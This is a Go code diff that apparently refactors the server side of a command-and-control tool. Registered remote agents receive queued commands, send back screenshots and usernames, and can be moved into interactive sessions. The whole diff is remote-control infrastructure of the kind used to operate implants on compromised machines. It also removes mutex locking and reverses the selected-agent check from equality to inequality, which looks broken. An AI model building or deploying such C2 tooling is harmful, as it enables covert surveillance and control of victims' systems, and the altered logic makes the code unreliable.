@@ -16,7 +16,6 @@ import (
 
 func Serve() {
 	go GetCommands()
-	go RunCommands()
 
 	root := http.NewServeMux()
 	root.Handle("/", http.HandlerFunc(requestHandler()))
@@ -32,21 +31,27 @@ func Serve() {
 	}
 }
 
-type ServerState struct {
-	registeredAgents []string
-	selectedAgent    string
+type Task struct {
+	Agent   string
+	Command string
 }
 
-var state ServerState = ServerState{selectedAgent: "none"}
+type ServerState struct {
+	RegisteredAgents []string
+	SelectedAgent    string
+	Tasks            []Task
+}
+
+var state ServerState = ServerState{SelectedAgent: "None"}
 
 func requestHandler() http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		if r.Header.Get("Register") == "true" {
 			uuid, _ := uuid.NewRandom()
 			w.Write([]byte(uuid.String()))
-			state.registeredAgents = append(state.registeredAgents, uuid.String())
+			state.RegisteredAgents = append(state.RegisteredAgents, uuid.String())
 			slog.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
-		} else if r.Header.Get("UUID") == state.selectedAgent {
+		} else if r.Header.Get("UUID") != state.SelectedAgent {
 			slog.Info("Connected Agent: \n")
 			slog.Info("Address: " + r.RemoteAddr)
 			slog.Info("Username: " + r.Header.Get("Username"))
@@ -70,14 +75,14 @@ func requestHandler() http.HandlerFunc {
 				png.Encode(out, image)
 			} else if string(response) != "" {
 				slog.Info("Received response:\n" + string(response))
-			} else {
-				mu.Lock()
-				if task.Command == "SESSION" {
+			}
+			if len(state.Tasks) != 0 {
+				if state.Tasks[0].Command == "SESSION" {
 					slog.Info("Initiating session")
 					go InitiateSession()
+					state.Tasks = state.Tasks[1:]
 				}
 				requestCommand(w)
-				mu.Unlock()
 			}
 		} else {
 			w.Write([]byte(""))
@@ -87,10 +92,12 @@ func requestHandler() http.HandlerFunc {
 }
 
 func requestCommand(w http.ResponseWriter) {
-	if task.Command != "" {
-		w.Write([]byte(task.Command))
-		slog.Info("Command requested: " + task.Command)
-		task.Command = ""
+	if len(state.Tasks) != 0 {
+		if state.Tasks[0].Command != "" {
+			w.Write([]byte(state.Tasks[0].Command))
+			slog.Info("Command requested: " + state.Tasks[0].Command)
+			state.Tasks = state.Tasks[1:]
+		}
 	} else {
 		w.Write([]byte(""))
 		slog.Info("Pinged agent")
